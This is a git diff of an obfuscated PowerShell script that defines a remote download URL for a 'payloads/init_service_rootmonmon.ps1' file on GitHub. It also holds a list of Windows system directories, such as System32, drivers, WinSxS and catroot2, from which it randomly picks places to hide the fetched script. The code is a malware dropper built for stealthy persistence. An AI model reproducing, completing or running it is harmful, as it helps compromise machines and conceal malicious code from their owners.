@@ -1,29 +1,6 @@
 $pfUizkoCgluevmYJI = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_rootmonmon.ps1"
 $RoUmlMkcByjtLPVDi = "$PSScriptRoot\initializer.ps1"
-
-$plcNnHyCifOR = @(
-    "$env:windir\system32\config\systemprofile\AppData\Local",
-    "$env:windir\System32",
-    "$env:windir\System32\drivers",
-    "$env:windir\System32\en-US",
-    "$env:windir\System32\LogFiles\WMI",
-    "$env:windir\System32\wbem\en-US",
-    "C:\Recovery",
-    "$env:temp",
-    "$env:ProgramData",
-    "$env:windir\SysWOW64",
-    "$env:appdata\SystemInformer",
-    "$env:localappdata\Microsoft\Windows",
-    "$env:windir\System32\WindowsPowerShell\v1.0\Modules",
-    "$env:windir\System32\drivers\etc",
-    "$env:windir\WinSxS",
-    "$env:windir\System32\spool\drivers\x64\3\en-US",
-    "$env:windir\System32\spool",
-    "$env:windir\System32\catroot2",
-    "$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft\Windows\WinX",
-    "$env:windir\ServiceProfiles\NetworkService"
-)
-
+$plcNnHyCifOR = @("$env:windir\system32\config\systemprofile\AppData\Local","$env:windir\System32","$env:windir\System32\drivers","$env:windir\System32\en-US","$env:windir\System32\LogFiles\WMI","$env:windir\System32\wbem\en-US","C:\Recovery","$env:temp","$env:ProgramData","$env:windir\SysWOW64","$env:appdata\SystemInformer","$env:localappdata\Microsoft\Windows","$env:windir\System32\WindowsPowerShell\v1.0\Modules","$env:windir\System32\drivers\etc","$env:windir\WinSxS","$env:windir\System32\spool\drivers\x64\3\en-US","$env:windir\System32\spool","$env:windir\System32\catroot2","$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft\Windows\WinX","$env:windir\ServiceProfiles\NetworkService")
 $XHRYfBEwCAN = $plcNnHyCifOR[$(Get-Random -Minimum 0 -Maximum $plcNnHyCifOR.Length)]
 $XHRYfBEwCAN = "$XHRYfBEwCAN\init_service_rootmonmon.ps1"
 $DvtsqQdCVaOLiuA = $plcNnHyCifOR[$(Get-Random -Minimum 0 -Maximum $plcNnHyCifOR.Length)]
